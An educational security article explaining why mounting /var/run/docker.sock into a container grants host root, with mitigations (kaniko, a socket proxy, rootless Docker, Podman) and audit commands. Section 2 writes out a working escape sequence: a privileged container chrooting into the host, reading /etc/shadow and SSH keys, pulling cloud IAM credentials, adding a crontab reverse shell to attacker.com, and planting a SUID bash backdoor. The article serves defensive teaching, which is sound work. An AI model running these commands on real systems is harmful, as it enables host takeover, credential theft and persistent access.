# Docker Socket Mounted in Container

### A Senior Engineer's Deep Dive for the Curious Intern

---

## 1. Setting the Scene — Handing the Master Key to a Tenant

Imagine a building manager who oversees a large apartment complex. The building has a master key — a single physical key that opens every door in the building: every apartment, every utility room, every electrical panel, every maintenance corridor, every floor above and below. The master key exists for emergencies, held in a safe in the manager's office, accessible only to the manager.

Now imagine a tenant — Apartment 5B — runs a small business from their apartment and asks the manager for access to a shared workspace on the ground floor. The manager, rather than cutting a key that opens only the workspace door, hands the tenant a copy of the master key. "Just make sure you only use it for the workspace," the manager says. The tenant is trustworthy, and they genuinely intend to use it only for the workspace. But the master key is now in Apartment 5B. If a visitor to 5B is a thief, if 5B's door is left unlocked, if the tenant loses the key — the entire building is compromised. The manager did not compromise the building directly. The manager created a condition under which the building was fully compromised by a single point of failure in a tenant's apartment.

Mounting `/var/run/docker.sock` into a container is handing the master key to a tenant. The Docker socket is the Unix socket through which all Docker API commands are processed. Whoever can write to this socket can issue any Docker API call: start containers, stop containers, create privileged containers, mount the host filesystem into a new container, pull images, push images, execute commands inside any running container. A process that controls the Docker socket controls every container on the host and, through the ability to create privileged containers with host filesystem mounts, has effective root access to the host operating system itself. Any container with the Docker socket mounted is, for security purposes, running as root on the host — regardless of what user the container process runs as.

## 2. The Exploit Path — From Container to Host Root in Three Commands

The exploit path from a mounted Docker socket to full host compromise is not a sophisticated, multi-stage attack. It is a three-command sequence that any developer who knows Docker can execute. The attacker needs only to gain code execution inside the container — through an RCE vulnerability in the application, a dependency with a known exploit, a SSRF vulnerability that allows arbitrary command execution, or simply the ability to exec into the container with `docker exec`. Once inside the container with the socket mounted:

```bash
# ── The Three-Command Host Escape ─────────────────────────────────────────────
# Executed INSIDE the compromised container that has /var/run/docker.sock mounted.
# The container itself runs as an unprivileged user.
# The attacker has just gained RCE through, e.g., a deserialization vulnerability.

# Step 1: Verify socket access (attacker confirms the socket is mounted and accessible)
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker 0 Sep 23 11:00 /var/run/docker.sock ← socket is here

# Step 2: Start a new container that mounts the HOST ROOT FILESYSTEM
# This uses the Docker socket (already mounted in the compromised container)
# to ask the Docker daemon to create a NEW container.
# The new container:
#   - Uses a full Linux image (alpine)
#   - Is PRIVILEGED (full kernel access)
#   - Mounts the HOST filesystem at /host inside the new container
docker run -it \
    --rm \
    --privileged \
    -v /:/host \          # Mount host root filesystem at /host
    alpine:latest \
    chroot /host sh       # chroot into the host filesystem → now running as host root

# Step 3: Inside the chroot — attacker IS root on the host
whoami
# root

# Attacker can now:
cat /etc/shadow                              # Read all host user password hashes
cat /root/.ssh/id_rsa                        # Steal SSH private keys
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/  # Steal cloud IAM credentials
crontab -l && echo "* * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /etc/crontab  # Persistence
cp /bin/bash /tmp/bash_suid && chmod u+s /tmp/bash_suid  # SUID backdoor
# ... full host compromise. Every secret on the host. Every running container.
```

This exploit requires no kernel exploit, no privilege escalation vulnerability, and no bypass of container security mechanisms. It works through entirely legitimate Docker API calls — the Docker daemon is doing exactly what it is designed to do when creating a privileged container with a host filesystem mount. The socket mount is the vulnerability. The container boundary provides zero protection once the socket is accessible.

```
              Docker Socket Exploit — Attack Surface Diagram
              ================================================

  HOST OPERATING SYSTEM
  ├── Docker Daemon (dockerd) ← controls everything
  │   │
  │   └── /var/run/docker.sock ← Unix socket, anyone who can write here
  │                               can make ANY Docker API call
  │
  ├── Container: jenkins_agent
  │   ├── Process: Jenkins agent (runs CI jobs)
  │   ├── Volume: /var/run/docker.sock:/var/run/docker.sock ← MOUNTED ❌
  │   │
  │   └── Vulnerability: RCE in a Jenkins plugin → attacker inside container
  │       Attacker has: access to /var/run/docker.sock
  │       Attacker can: call Docker API from inside the container
  │       Attacker does: docker run --privileged -v /:/host alpine chroot /host sh
  │                                    ↑
  │                      Docker daemon receives this API call
  │                      Docker daemon: creates new privileged container ← no questions asked
  │                      New container: root on host filesystem ✅ (for attacker)
  │
  └── Container: postgres_db (unrelated to jenkins)
      Container: redis (unrelated to jenkins)
      Container: nginx (unrelated to jenkins)
      ALL containers: can now be inspected, stopped, deleted, backdoored by attacker.
      Host filesystem: fully readable and writable.
      Cloud IAM credentials: accessible via metadata service.
      All secrets in all containers: docker inspect <every container>

  Security perimeter: DESTROYED by a single socket mount.
```

The attack does not require the container to run as root. A container running as UID 1000 (non-root) with the Docker socket mounted can still execute every step of the exploit above, because the Docker daemon runs as root and will honor API requests from the socket regardless of the requesting process's UID — as long as the process has permission to write to the socket file. On most systems, the Docker socket is owned by the `docker` group with group-write permission, and any process in the docker group can communicate with the daemon.

## 3. Why This Pattern Exists — The Legitimate Use Cases

The Docker socket is mounted into containers because there are genuinely valid use cases that appear to require it. Understanding why developers reach for the socket mount helps in understanding why the alternatives exist and why they are sometimes resisted:

**CI Build Agents.** Jenkins, Drone CI, GitLab Runner in Docker executor mode, and similar CI systems often need to build Docker images as part of the CI pipeline. A naive implementation runs the CI agent in a container and mounts the Docker socket so the agent can call `docker build`. The appeal is simplicity — the agent uses the same Docker CLI that developers use locally, with no additional infrastructure.

**Container Management Tools.** Portainer, Watchtower (which automatically updates containers when new images are published), and similar management tools need to inspect and manage containers on the host. They mount the socket to access the Docker API.

**Monitoring and Observability Agents.** Some monitoring tools (older versions of certain log aggregators, metadata collectors) mount the socket to discover running containers and their metadata — service names, labels, resource usage — for log routing and metrics collection.

**Auto-Deployment Hooks.** Webhook handlers that listen for deployment events and pull new images + restart services sometimes use the socket to orchestrate the redeployment.

In every case, the legitimate need can be satisfied without mounting the full Docker socket, either by using a purpose-built alternative that avoids the daemon entirely or by using a socket proxy that restricts API access to the specific calls needed.

## 4. Solution 1 — kaniko: Docker Image Builds Without the Daemon

For CI image builds, `kaniko` is the canonical solution that eliminates the need for the Docker daemon entirely. kaniko is a tool developed by Google that builds container images from a Dockerfile inside a container or Kubernetes pod without requiring a privileged execution environment or access to the Docker daemon. It reads the Dockerfile, executes each layer in user space, and pushes the resulting image to a registry — all without daemon involvement.

```yaml
# docker-compose.yml — CI build stage using kaniko instead of docker build

services:
  # WRONG: CI agent with Docker socket (do not use in production)
  # jenkins_wrong:
  #   image: jenkins/jenkins:lts
  #   volumes:
  #     - /var/run/docker.sock:/var/run/docker.sock  ← NEVER ❌

  # CORRECT: kaniko builder — no daemon, no socket, no privilege
  image_builder:
    image: gcr.io/kaniko-project/executor:latest
    # kaniko runs as non-root, needs no special privileges,
    # and requires no access to the Docker socket.
    # It reads the Dockerfile and build context from the filesystem
    # and pushes directly to the registry.
    command:
      - "--context=dir:///workspace"          # Build context directory
      - "--dockerfile=/workspace/Dockerfile"  # Dockerfile path
      - "--destination=registry.example.com/myapp:latest"  # Push destination
      - "--cache=true"                        # Use kaniko layer cache
      - "--cache-repo=registry.example.com/myapp/cache"
    volumes:
      - ./:/workspace:ro                      # Read-only build context ✅
      - ~/.docker/config.json:/kaniko/.docker/config.json:ro  # Registry credentials
    # NO /var/run/docker.sock mount ✅
    # NO --privileged flag ✅
    # NO root requirement ✅
```

```yaml
# GitHub Actions — kaniko for CI image builds (no Docker socket in runner)
name: Build and Push

on: [push]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build and push with kaniko
        uses: int128/kaniko-action@v1
        with:
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
          cache: true
          cache-repository: ghcr.io/${{ github.repository }}/cache
        # No Docker daemon required. No Docker socket access.
        # kaniko runs as a standalone process in the runner. ✅
```

## 5. Solution 2 — The Docker Socket Proxy

When socket access is genuinely required — for Portainer, Watchtower, or a monitoring agent that must enumerate containers — the `Tecnativa/docker-socket-proxy` provides a critical mitigation layer. The socket proxy is a container that sits between the tool and the Docker daemon, exposing only a subset of the Docker API through a read-only or operation-restricted interface. The tool mounts the proxy's socket rather than the real Docker socket, and the proxy enforces an allowlist of permitted API calls.

```yaml
# docker-compose.yml — Docker socket proxy pattern

services:
  # The socket proxy sits between tools and the real Docker daemon.
  # It exposes only the permitted API endpoints to containers that use it.
  docker-socket-proxy:
    image: tecnativa/docker-socket-proxy:latest
    volumes:
      # The PROXY is the only container that mounts the real socket.
      # It runs with specific permissions to access it.
      - /var/run/docker.sock:/var/run/docker.sock:ro  # Read-only to proxy ✅
    environment:
      # API allowlist — deny everything by default, permit only what's needed.
      # Default: all are 0 (deny). Set to 1 to permit.

      # Read operations (typically safe to permit for monitoring):
      CONTAINERS: 1      # GET /containers/* (list, inspect containers)
      SERVICES:   1      # GET /services/* (Swarm services)
      TASKS:      0      # Swarm tasks — permit only if needed
      SECRETS:    0      # ← NEVER permit — would expose secret metadata
      CONFIGS:    0

      # Network operations:
      NETWORKS:   1      # GET /networks/* (list networks)
      VOLUMES:    0      # Permit only if the tool genuinely needs it

      # Dangerous operations — DENY THESE ALWAYS:
      ALLOW_START:   0   # POST /containers/{id}/start ← attacker can start containers ❌
      ALLOW_STOP:    0   # POST /containers/{id}/stop ← attacker can stop DB ❌
      ALLOW_RESTARTS:0
      POST:          0   # All POST requests (creates, starts) blocked by default ✅
      DELETE:        0   # All DELETE requests blocked ✅
      BUILD:         0   # POST /build ← NO image building through proxy ✅
      COMMIT:        0
      EXEC:          0   # POST /exec ← NO container exec through proxy ✅
      IMAGES:        1   # GET /images/* (list images — read only)
      INFO:          1   # GET /info (daemon info)
      PING:          1   # GET /_ping (health check)
      VERSION:       1   # GET /version
    networks:
      - socket-proxy-net  # Isolated network — only proxy tools connect here
    restart: unless-stopped

  # Portainer: manages containers via the PROXY socket, not the real socket.
  portainer:
    image: portainer/portainer-ce:latest
    command: -H tcp://docker-socket-proxy:2375  # Connect to proxy, not real socket ✅
    volumes:
      - portainer_data:/data
    ports:
      - "9000:9000"
    networks:
      - socket-proxy-net   # Can reach proxy
      - frontend           # Can be reached by browser
    # NO /var/run/docker.sock mount ✅
    restart: unless-stopped

  # Watchtower: auto-updates containers via proxy.
  watchtower:
    image: containrrr/watchtower:latest
    environment:
      DOCKER_HOST: tcp://docker-socket-proxy:2375  # Use proxy socket ✅
      WATCHTOWER_CLEANUP: "true"
      WATCHTOWER_POLL_INTERVAL: "300"
    networks:
      - socket-proxy-net
    # NO /var/run/docker.sock mount ✅
    restart: unless-stopped

networks:
  socket-proxy-net:   # Isolated — only proxy and proxy-consumers are here
    internal: true    # No external access to this network
  frontend:

volumes:
  portainer_data:
```

```
              Socket Proxy — API Restriction Effectiveness
              ==============================================

  Without proxy (raw socket mount):
  Attacker inside Portainer container calls:
  POST /containers/create {"Image":"alpine","HostConfig":{"Privileged":true,"Binds":["/:/host"]}}
  → Docker daemon: creates privileged container with host mount ← full compromise ❌

  With proxy (Tecnativa docker-socket-proxy):
  Attacker inside Portainer container calls:
  POST /containers/create ...
  → Proxy receives request: POST is in blocked category (POST: 0 in config)
  → Proxy response: 403 Forbidden ✅
  → Attacker cannot create containers through the proxy. ✅

  What the attacker CAN do through the proxy (given config above):
  GET /containers/json → list running containers (names, IDs, status)
  GET /containers/{id}/json → inspect a specific container
  GET /images/json → list available images

  What the attacker CANNOT do:
  POST /containers/create → blocked ✅
  POST /containers/{id}/start → blocked ✅
  POST /exec → blocked ✅
  DELETE /containers/{id} → blocked ✅

  The blast radius of a compromised Portainer: metadata visibility only.
  Not: full host compromise.
  The socket proxy did not eliminate the risk — it bounded it. ✅
```

## 6. Solution 3 — Rootless Docker and Podman

For environments where socket access is unavoidable — where no suitable proxy or alternative exists — running the Docker daemon itself in rootless mode or switching to Podman significantly reduces the blast radius of a socket compromise.

**Rootless Docker** runs the entire Docker daemon as a non-root user. The daemon process, all container processes, and the Docker socket itself are owned by a regular user. When a container with the socket mounted escapes to the host, it does so as that non-root user rather than as root. It cannot read `/root/.ssh`, cannot modify system files, cannot install persistence mechanisms in system directories, and cannot access other users' data. The blast radius is bounded to the user running the Docker daemon.

**Podman** (the Podman project from Red Hat) is a daemonless container runtime that is API-compatible with Docker but does not use a central daemon. Each `podman run` creates container processes directly under the calling user's process tree. There is no central socket to compromise. CI pipelines that build images with `podman build` and run containers with `podman run` have no central daemon socket to mount and therefore no socket-based privilege escalation path.

```bash
# Installing and using Rootless Docker (Ubuntu):
# 1. Install rootlesskit and slirp4netns:
apt-get install -y uidmap slirp4netns

# 2. Set up rootless Docker for the current user:
dockerd-rootless-setuptool.sh install

# 3. Configure environment to use rootless socket:
export DOCKER_HOST=unix://$XDG_RUNTIME_DIR/docker.sock

# Now docker commands use the user-owned socket.
# If a container with this socket escapes: it is root in its own user namespace,
# mapped to the regular user on the host — cannot access host root. ✅

# Podman (Red Hat / Fedora / RHEL / Ubuntu 20.04+):
# Fully rootless by default. No daemon. No central socket.
podman build -t myapp:latest .
podman run --rm myapp:latest
# No socket to mount. No daemon to compromise. ✅

# For CI image builds in Kubernetes: use Buildah (companion to Podman)
# for truly daemonless, rootless container image builds:
buildah bud -t registry.example.com/myapp:latest .
buildah push registry.example.com/myapp:latest
```

## 7. Detecting the Socket Mount — Security Audit

Identifying all containers in a deployment that have the Docker socket mounted is a critical step in a security audit. A single command on the host identifies every running container with the socket:

```bash
# ── Find all containers with Docker socket mounted ────────────────────────────
docker ps -q | xargs -I{} docker inspect {} \
    --format='{{.Name}}: {{range .Mounts}}{{if eq .Source "/var/run/docker.sock"}}SOCKET MOUNTED ❌{{end}}{{end}}'

# More detailed output with source and destination:
docker ps -q | xargs -I{} docker inspect {} \
    --format='Container: {{.Name}}
Mounts:{{range .Mounts}}
  - Source: {{.Source}} → Dest: {{.Destination}} (Type: {{.Type}}, Mode: {{.Mode}}){{end}}' \
    | grep -B2 "docker.sock"

# Example output:
# Container: /jenkins_agent
#   - Source: /var/run/docker.sock → Dest: /var/run/docker.sock (Type: bind, Mode: rw) ← ❌ CRITICAL

# ── Check if any container is running as --privileged ────────────────────────
docker ps -q | xargs -I{} docker inspect {} \
    --format='{{.Name}}: Privileged={{.HostConfig.Privileged}}'
# /jenkins_agent: Privileged=false   ← Good, but socket mount already full compromise
# /build_agent: Privileged=true      ← CRITICAL ❌ Do not run privileged containers

# ── Check for host network mode (another escape vector) ──────────────────────
docker ps -q | xargs -I{} docker inspect {} \
    --format='{{.Name}}: NetworkMode={{.HostConfig.NetworkMode}}'
# Any "host" network mode: container shares host network namespace → security risk

# ── Check for sensitive host path mounts ─────────────────────────────────────
docker ps -q | xargs -I{} docker inspect {} \
    --format='{{.Name}}:{{range .Mounts}}{{if .Source}} {{.Source}}{{end}}{{end}}' \
    | grep -E "/etc|/root|/proc|/sys|/var/run"
# Any match: container has access to sensitive host paths ← review carefully
```

## 9. The Golden Rule

> The Docker socket at `/var/run/docker.sock` is the administrative interface of the Docker daemon — the single channel through which all container creation, execution, deletion, and management operations flow. Any process that can write to this socket is, in effect, the Docker daemon's administrator and can instruct it to create privileged containers with host filesystem mounts, providing unrestricted root access to the host operating system. Mounting this socket into a container does not grant the container "some" Docker access — it grants the container complete, unrestricted control over the host, equal to root on the bare metal. The path from socket access to full host root is three shell commands available in any container with a Docker CLI installed. Every RCE vulnerability in a container with the socket mounted is immediately a full host compromise. Never mount the Docker socket into a container in production. For CI image builds, use kaniko, Buildah, or BuildKit — purpose-built tools that build container images without daemon access. For container management tools that need to inspect or interact with the Docker daemon, use the `Tecnativa/docker-socket-proxy` to expose only the specific read-only API endpoints the tool requires, in a network-isolated environment where only that tool can reach the proxy. For any environment where socket access cannot be avoided, use rootless Docker or Podman to ensure that a socket compromise provides access only to the daemon user's privileges rather than host root. Audit every container with a Docker socket mount as a critical security finding, regardless of whether the container appears to be trusted.

The Docker socket is the master key to the host. Do not put it in any room you cannot fully trust, because you can never fully trust a container.
